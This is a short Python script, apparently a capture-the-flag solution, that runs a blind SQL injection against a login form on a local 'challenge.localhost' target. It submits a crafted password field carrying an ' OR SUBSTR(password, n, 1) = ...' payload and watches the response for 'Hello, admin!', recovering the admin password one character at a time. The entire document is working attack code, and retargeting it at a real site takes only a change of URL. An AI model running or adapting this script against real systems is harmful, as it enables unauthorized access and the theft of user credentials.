# https://www.sqlitetutorial.net/sqlite-glob/
# be careful with using the LIKE operator because it is case insensitive.
# so if you do p% and the real password is "PASSword" it'll return true anyway.

import requests

# Target URL and vulnerable endpoint
url = "http://127.0.0.1"  # Replace with the actual URL

headers = {
    "Host": "challenge.localhost"  # Corrected headers format
}

# Known prefix of the password (starts as empty)
password = ""

# Characters to test (assuming the password contains these characters)
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_{}"

# Function to check if a specific payload results in a "true" response
def is_valid_payload(payload):
    data = {"username": "admin", "password": payload}  # Adjust field names as needed
    response = requests.post(url, data=data, headers=headers)
    # Success condition based on the page content
    return "Hello, admin!" in response.text

# Blind SQL injection to extract the password character by character
print("Extracting password...")
while True:
    found_char = False
    for char in charset:
        # Crafting the SQL injection to extract each character of the password
        payload = f"\" OR SUBSTR(password, {len(password) + 1}, 1) = '{char}' --"
        if is_valid_payload(payload):
            password += char
            print(f"Found so far: {password}")
            found_char = True
            break
    if not found_char:
        break  # No more characters found; exit loop

print(f"Password: {password}")
